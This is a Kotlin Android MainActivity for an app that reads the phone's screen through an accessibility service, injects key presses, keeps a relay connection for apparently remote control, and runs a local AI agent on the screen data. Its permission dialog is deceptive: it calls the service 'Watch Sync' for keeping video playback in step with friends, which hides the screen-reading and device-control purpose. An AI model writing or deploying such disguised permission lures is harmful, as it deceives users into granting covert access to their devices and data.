package com.phonehand.app

import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Intent
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.view.View
import android.view.accessibility.AccessibilityManager
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import com.google.android.material.textfield.TextInputEditText

class MainActivity : AppCompatActivity() {

    private lateinit var statusText: TextView
    private lateinit var deviceIdText: TextView
    private lateinit var labelInput: TextInputEditText
    private lateinit var controlSection: LinearLayout
    private lateinit var setupHint: TextView
    private lateinit var screenSummary: TextView
    private lateinit var promptInput: TextInputEditText
    private lateinit var aiLog: TextView
    private lateinit var btnAiRun: Button

    private var openedSettings = false
    private var showedDisclosure = false
    private var agentRunning = false
    private val mainHandler = Handler(Looper.getMainLooper())
    private val refreshSummary = object : Runnable {
        override fun run() {
            updateScreenSummary()
            mainHandler.postDelayed(this, 1500)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        if (!UserSession.isSignedUp(this)) {
            startActivity(Intent(this, OnboardingActivity::class.java))
            finish()
            return
        }
        setContentView(R.layout.activity_main)
        bindViews()
        labelInput.setText(DeviceId.label(this))
        deviceIdText.text = "id: ${DeviceId.shortId(this)}…"

        labelInput.setOnFocusChangeListener { _, hasFocus -> if (!hasFocus) saveLabel() }

        findViewById<Button>(R.id.btnBack).setOnClickListener { sendKey("back") }
        findViewById<Button>(R.id.btnHome).setOnClickListener { sendKey("home") }
        findViewById<Button>(R.id.btnRecents).setOnClickListener { sendKey("recents") }
        findViewById<Button>(R.id.btnPower).setOnClickListener { sendKey("power") }
        findViewById<Button>(R.id.btnVolUp).setOnClickListener { sendKey("volume_up") }
        findViewById<Button>(R.id.btnVolDown).setOnClickListener { sendKey("volume_down") }
        btnAiRun.setOnClickListener { runAi() }

        refresh()
        if (!isTouchReady()) {
            if (!UserSession.onboardingDone(this)) {
                startActivity(Intent(this, OnboardingActivity::class.java))
                finish()
                return
            }
            showDisclosureThenSettings()
        }
    }

    private fun bindViews() {
        statusText = findViewById(R.id.statusText)
        deviceIdText = findViewById(R.id.deviceIdText)
        labelInput = findViewById(R.id.labelInput)
        controlSection = findViewById(R.id.controlSection)
        setupHint = findViewById(R.id.setupHint)
        screenSummary = findViewById(R.id.screenSummary)
        promptInput = findViewById(R.id.promptInput)
        aiLog = findViewById(R.id.aiLog)
        btnAiRun = findViewById(R.id.btnAiRun)
    }

    override fun onPause() {
        super.onPause()
        saveLabel()
        mainHandler.removeCallbacks(refreshSummary)
    }

    override fun onResume() {
        super.onResume()
        refresh()
        if (isTouchReady()) {
            TouchAccessibilityService.instance?.ensureRelay()
            controlSection.visibility = View.VISIBLE
            setupHint.visibility = View.GONE
            mainHandler.post(refreshSummary)
        } else {
            controlSection.visibility = View.GONE
            setupHint.visibility = View.VISIBLE
            if (!openedSettings) showDisclosureThenSettings()
        }
    }

    private fun sendKey(action: String) {
        InputHandler.handle(this, """{"type":"key","action":"$action"}""")
        appendLog("key: $action")
    }

    private fun runAi() {
        if (agentRunning) return
        val prompt = promptInput.text?.toString()?.trim().orEmpty()
        if (prompt.isEmpty()) return
        val tree = TouchAccessibilityService.instance?.lastTreeJson
        if (tree == null) {
            appendLog("error: no screen data yet")
            return
        }
        val screen = ScreenSummarizer.compact(tree)
        agentRunning = true
        btnAiRun.isEnabled = false
        appendLog("you: $prompt")
        promptInput.setText("")
        LocalAgent.run(this, prompt, screen, object : LocalAgent.Callback {
            override fun onLog(line: String) {
                runOnUiThread { appendLog(line) }
            }

            override fun onDone() {
                runOnUiThread {
                    agentRunning = false
                    btnAiRun.isEnabled = true
                    updateScreenSummary()
                }
            }

            override fun onError(message: String) {
                runOnUiThread {
                    appendLog("error: $message")
                    agentRunning = false
                    btnAiRun.isEnabled = true
                }
            }
        })
    }

    private fun appendLog(line: String) {
        val prev = aiLog.text?.toString().orEmpty()
        val next = if (prev == "AI log…") line else "$prev\n$line"
        aiLog.text = next.takeLast(1200)
    }

    private fun updateScreenSummary() {
        val tree = TouchAccessibilityService.instance?.lastTreeJson
        screenSummary.text = if (tree != null) {
            ScreenSummarizer.compact(tree)
        } else {
            "reading screen…"
        }
    }

    private fun saveLabel() {
        val text = labelInput.text?.toString()?.trim().orEmpty()
        if (text.isNotEmpty()) {
            DeviceId.setLabel(this, text)
            TouchAccessibilityService.instance?.reconnectRelay()
        }
    }

    private fun showDisclosureThenSettings() {
        if (showedDisclosure) {
            openAccessibilitySettings()
            return
        }
        showedDisclosure = true
        AlertDialog.Builder(this)
            .setTitle("Turn on Watch Sync")
            .setMessage(
                "Watch Sync keeps play, pause, and fast-forward matched when you watch with friends.\n\n" +
                    "In Settings, find Watch Sync and switch it on."
            )
            .setPositiveButton("Continue") { _, _ -> openAccessibilitySettings() }
            .setNegativeButton("Cancel", null)
            .setCancelable(false)
            .show()
    }

    private fun openAccessibilitySettings() {
        openedSettings = true
        startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
    }

    private fun refresh() {
        statusText.text = if (isTouchReady()) {
            "● live · ${DeviceId.label(this)}"
        } else {
            "turn on Watch Sync in Accessibility"
        }
    }

    private fun isTouchReady(): Boolean {
        val am = getSystemService(ACCESSIBILITY_SERVICE) as AccessibilityManager
        return am.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_GENERIC)
            .any { it.resolveInfo.serviceInfo.packageName == packageName }
    }
}
